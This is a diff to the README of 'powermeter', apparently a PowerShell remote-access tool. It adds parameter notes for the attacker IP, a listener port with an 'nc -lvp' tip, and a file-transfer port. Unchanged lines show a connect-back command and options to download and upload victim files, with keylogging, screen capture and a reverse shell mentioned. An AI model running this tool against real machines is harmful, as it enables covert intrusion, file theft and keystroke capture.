@@ -6,6 +6,11 @@ Note: It is highly recommended to watch the video at 1080p due to low quality. I
 
 	>> PS C:\Users\decoder\Desktop> . .\powermeter.ps1
 	>> PS C:\Users\decoder\Desktop> Start-Powermeter -SHOST 192.168.214.1 -SPORT 9190 -FLPORT 9192
+	
+	Parameters:
+	SHOST - attacker machine's IP.
+	SPORT - an open attacker machine port that waits for powermeter connection. #'nc -lvp <SPORT>' command can do the trick.
+	FLPORT - attacker machine's file transfer port. This port should be opened at attacker's side to achieve jobs which includes downloading and uploading. (Screencapturing and keylogging are also inclusive because both of them use downloader threads. You may want to see the demo video to see how it works.)
 
 In main module:
 
@@ -32,7 +37,7 @@ Options
 	 download <fileFromVictim>			 Download a file from victim machine.[<fileFromVictim>: An absolute file path in victim machine that the attacker downloads]
 	 upload <fileToVictim>  			 Upload a file to victim machine.[<fileToVictim>: An absolute file path in victim machine to store file uploaded by attacker]
 	 exit                   			 Exit the program
-	 Important: File transfer port should be opened in attacker's side to achieve downloading,uploading files.
+	 Important: File transfer port should be opened at attacker's side to achieve downloading,uploading files.
 
 In reverse shell module:
 
